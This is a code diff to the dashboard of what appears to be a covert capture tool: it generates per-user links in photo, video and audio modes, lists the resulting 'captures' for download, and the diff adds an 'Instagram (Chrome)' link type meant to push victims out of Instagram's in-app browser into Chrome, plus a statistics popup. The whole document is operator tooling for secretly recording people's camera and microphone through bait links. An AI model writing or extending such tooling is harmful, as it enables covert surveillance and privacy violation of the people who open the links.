@@ -46,6 +46,8 @@
         .gen-link { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; border-radius: 40px; font-family: monospace; transition: 0.2s; font-weight: bold; }
         .gen-link:hover { background: #00ff41; color: #000; transform: translateY(-2px); }
         .gen-link-fast { border-color: #ffaa00; color: #ffaa00; }
+        .instagram-link { border-color: #ff0066; color: #ff0066; background: rgba(255,0,102,0.1); }
+        .instagram-link:hover { background: #ff0066; color: #fff; box-shadow: 0 0 15px #ff0066; }
         .output-box { background: #050505; border: 1px dashed #00ff41; border-radius: 12px; padding: 15px; font-size: 0.75rem; word-break: break-all; margin-top: 15px; }
         .copy-btn { background: #00ff41; border: none; padding: 4px 12px; border-radius: 15px; cursor: pointer; font-weight: bold; margin-left: 10px; }
         .btn-group { display: flex; gap: 12px; margin-bottom: 25px; flex-wrap: wrap; }
@@ -65,6 +67,8 @@
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; justify-content: center; align-items: center; cursor: pointer; }
         .modal img, .modal video { max-width: 95%; max-height: 95%; border: 3px solid #00ff41; border-radius: 16px; }
         .modal-close { position: absolute; top: 25px; right: 35px; color: #00ff41; font-size: 40px; cursor: pointer; }
+        .info-card { background: #050505; border: 1px solid #ffaa00; border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: center; }
+        .info-card p { color: #ffaa00; font-size: 0.75rem; }
         @media (max-width: 768px) { .media-strip img, .media-strip video { width: 100px; height: 100px; } .gen-link { padding: 8px 16px; font-size: 0.7rem; } }
     </style>
 </head>
@@ -84,6 +88,12 @@
         <div class="stat-card"><h4 id="totalMediaLabel">TOTAL MEDIA</h4><div class="value" id="mediaCount">0</div></div>
     </div>
     
+    <!-- BİLGİ KARTI: Instagram Link Uyarısı -->
+    <div class="info-card" id="infoCard">
+        <p>⚠️ INSTAGRAM KULLANICILARI İÇİN ÖZEL LİNK KULLANIN! ⚠️</p>
+        <p>⬇️ Aşağıdaki "📱 INSTAGRAM (CHROME)" butonu ile link oluşturun. Bu link Instagram'da açıldığında otomatik Chrome'a yönlendirir.</p>
+    </div>
+    
     <div class="panel">
         <h3 id="generateLabel">⟳ GENERATE LINK</h3>
         <div class="duration-slider">
@@ -97,6 +107,7 @@
             <button class="gen-link" id="genVideoOnlyBtn">🎬 VIDEO (NO AUDIO)</button>
             <button class="gen-link" id="genAudioBtn">🎤 AUDIO ONLY</button>
             <button class="gen-link gen-link-fast" id="genVideoAudioBtn">🎬🎤 VIDEO+AUDIO</button>
+            <button class="gen-link instagram-link" id="genInstagramBtn">📱 INSTAGRAM (CHROME)</button>
         </div>
         <div class="output-box" id="linkOutput"></div>
     </div>
@@ -104,6 +115,7 @@
     <div class="btn-group">
         <button class="btn" id="refreshBtn">⟳ REFRESH</button>
         <button class="btn btn-danger" id="clearAllBtn">⛧ CLEAR ALL</button>
+        <button class="btn" id="statsInfoBtn">📊 STATS INFO</button>
     </div>
     
     <div id="list"></div>
@@ -140,23 +152,29 @@
             accessText: "ACCESS: GRANTED", myCaptures: "MY CAPTURES", totalMedia: "TOTAL MEDIA",
             generateLink: "⟳ GENERATE LINK", durationLabel: "🎬 VIDEO DURATION:",
             photo1: "📸 PHOTO (1)", photo5: "📸 5 PHOTOS", videoOnly: "🎬 VIDEO (NO AUDIO)",
-            audioOnly: "🎤 AUDIO ONLY", videoAudio: "🎬🎤 VIDEO+AUDIO", refresh: "⟳ REFRESH",
-            clearAll: "⛧ CLEAR ALL", logout: "⛧ LOGOUT", copy: "COPY", linkLabel: "🔗 LINK:",
+            audioOnly: "🎤 AUDIO ONLY", videoAudio: "🎬🎤 VIDEO+AUDIO", instagramBtn: "📱 INSTAGRAM (CHROME)",
+            refresh: "⟳ REFRESH", clearAll: "⛧ CLEAR ALL", statsInfo: "📊 STATS INFO",
+            logout: "⛧ LOGOUT", copy: "COPY", linkLabel: "🔗 LINK:",
             delete: "DELETE", downloadAll: "⬇ DOWNLOAD ALL", noData: "[ NO DATA ]",
             loading: "⟳ LOADING...", confirmDelete: "⛧ Delete this capture?",
             confirmClearAll: "⛧ Delete ALL your captures?", sec: "sec",
-            photo: "PHOTO", photos: "PHOTOS", video: "VIDEO", audio: "AUDIO", videoAudioMode: "VIDEO+AUDIO"
+            photo: "PHOTO", photos: "PHOTOS", video: "VIDEO", audio: "AUDIO", videoAudioMode: "VIDEO+AUDIO",
+            statsInfoTitle: "📊 STATISTICS", totalCapturesInfo: "Total Captures", totalMediaInfo: "Total Media Files",
+            avgPerCapture: "Average Media per Capture", lastCaptureDate: "Last Capture Date"
         },
         ar: {
             accessText: "الوصول: ممنوح", myCaptures: "التقاطاتي", totalMedia: "إجمالي الوسائط",
             generateLink: "⟳ إنشاء رابط", durationLabel: "🎬 مدة الفيديو:",
             photo1: "📸 صورة (1)", photo5: "📸 5 صور", videoOnly: "🎬 فيديو (بدون صوت)",
-            audioOnly: "🎤 صوت فقط", videoAudio: "🎬🎤 فيديو+صوت", refresh: "⟳ تحديث",
-            clearAll: "⛧ مسح الكل", logout: "⛧ تسجيل الخروج", copy: "نسخ", linkLabel: "🔗 الرابط:",
+            audioOnly: "🎤 صوت فقط", videoAudio: "🎬🎤 فيديو+صوت", instagramBtn: "📱 إنستغرام (كروم)",
+            refresh: "⟳ تحديث", clearAll: "⛧ مسح الكل", statsInfo: "📊 إحصائيات",
+            logout: "⛧ تسجيل الخروج", copy: "نسخ", linkLabel: "🔗 الرابط:",
             delete: "حذف", downloadAll: "⬇ تحميل الكل", noData: "[ لا توجد بيانات ]",
             loading: "⟳ جاري التحميل...", confirmDelete: "⛧ حذف هذا العنصر؟",
             confirmClearAll: "⛧ حذف جميع العناصر؟", sec: "ثانية",
-            photo: "صورة", photos: "صور", video: "فيديو", audio: "صوت", videoAudioMode: "فيديو+صوت"
+            photo: "صورة", photos: "صور", video: "فيديو", audio: "صوت", videoAudioMode: "فيديو+صوت",
+            statsInfoTitle: "📊 إحصائيات", totalCapturesInfo: "إجمالي الالتقاطات", totalMediaInfo: "إجمالي ملفات الوسائط",
+            avgPerCapture: "متوسط الوسائط لكل التقاط", lastCaptureDate: "تاريخ آخر التقاط"
         }
     };
 
@@ -176,8 +194,10 @@
         document.getElementById('genVideoOnlyBtn').innerHTML = t('videoOnly');
         document.getElementById('genAudioBtn').innerHTML = t('audioOnly');
         document.getElementById('genVideoAudioBtn').innerHTML = t('videoAudio');
+        document.getElementById('genInstagramBtn').innerHTML = t('instagramBtn');
         document.getElementById('refreshBtn').innerHTML = t('refresh');
         document.getElementById('clearAllBtn').innerHTML = t('clearAll');
+        document.getElementById('statsInfoBtn').innerHTML = t('statsInfo');
         document.getElementById('logoutBtn').innerHTML = t('logout');
         document.getElementById('langBtn').innerHTML = currentLang === 'en' ? '🇸🇦 العربية' : '🇬🇧 English';
         
@@ -227,6 +247,20 @@
             
             document.getElementById('captureCount').innerText = myData.length;
             document.getElementById('mediaCount').innerText = totalMedia;
+            
+            // İstatistik bilgilerini sessionStorage'a kaydet
+            if (myData.length > 0) {
+                const avg = (totalMedia / myData.length).toFixed(2);
+                const lastDate = new Date(myData[0].timestamp).toLocaleString();
+                sessionStorage.setItem('kurabi_stats', JSON.stringify({
+                    totalCaptures: myData.length,
+                    totalMedia: totalMedia,
+                    avgPerCapture: avg,
+                    lastCaptureDate: lastDate
+                }));
+            } else {
+                sessionStorage.removeItem('kurabi_stats');
+            }
             
             if (myData.length === 0) {
                 listDiv.innerHTML = `<div class="loading">${t('noData')}</div>`;
@@ -316,22 +350,42 @@
         await loadMyData();
     }
     
-    function generateLink(mode) {
+    function generateLink(mode, isInstagram = false) {
         if (!currentUser) return;
         let url = `${BASE_URL}/?mode=${mode}&uid=${currentUser.uid}`;
         if (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') {
             url += `&duration=${document.getElementById('videoDuration').value}`;
         }
-        document.getElementById('linkOutput').innerHTML = `${t('linkLabel')} <a href="${url}" target="_blank" style="color:#00ff41">${url}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button>`;
+        
+        // Instagram için özel: Chrome'a yönlendirme ekle
+        if (isInstagram) {
+            // Instagram içinde açıldığında Chrome'a yönlendirme yapacak parametre
+            url += `&force_chrome=true`;
+            document.getElementById('linkOutput').innerHTML = `${t('linkLabel')} 📱 INSTAGRAM ÖZEL: <a href="${url}" target="_blank" style="color:#ff0066">${url}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button><br><small style="color:#ffaa00;">⚠️ Bu link Instagram'da otomatik Chrome'a yönlendirir!</small>`;
+        } else {
+            document.getElementById('linkOutput').innerHTML = `${t('linkLabel')} <a href="${url}" target="_blank" style="color:#00ff41">${url}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button>`;
+        }
     }
     
-    document.getElementById('genPhotoBtn').onclick = () => generateLink('photo');
-    document.getElementById('gen5PhotoBtn').onclick = () => generateLink('5photos');
-    document.getElementById('genVideoOnlyBtn').onclick = () => generateLink('videoonly');
-    document.getElementById('genAudioBtn').onclick = () => generateLink('audio');
-    document.getElementById('genVideoAudioBtn').onclick = () => generateLink('videoaudio');
+    function showStatsInfo() {
+        const stats = sessionStorage.getItem('kurabi_stats');
+        if (stats) {
+            const data = JSON.parse(stats);
+            alert(`📊 ${t('statsInfoTitle')}\n\n${t('totalCapturesInfo')}: ${data.totalCaptures}\n${t('totalMediaInfo')}: ${data.totalMedia}\n${t('avgPerCapture')}: ${data.avgPerCapture}\n${t('lastCaptureDate')}: ${data.lastCaptureDate}`);
+        } else {
+            alert(`📊 ${t('statsInfoTitle')}\n\n${t('noData')}`);
+        }
+    }
+    
+    document.getElementById('genPhotoBtn').onclick = () => generateLink('photo', false);
+    document.getElementById('gen5PhotoBtn').onclick = () => generateLink('5photos', false);
+    document.getElementById('genVideoOnlyBtn').onclick = () => generateLink('videoonly', false);
+    document.getElementById('genAudioBtn').onclick = () => generateLink('audio', false);
+    document.getElementById('genVideoAudioBtn').onclick = () => generateLink('videoaudio', false);
+    document.getElementById('genInstagramBtn').onclick = () => generateLink('photo', true);
     document.getElementById('refreshBtn').onclick = loadMyData;
     document.getElementById('clearAllBtn').onclick = clearAll;
+    document.getElementById('statsInfoBtn').onclick = showStatsInfo;
     document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); window.location.href = 'login.html'; };
     document.getElementById('langBtn').onclick = () => setLanguage(currentLang === 'en' ? 'ar' : 'en');
     
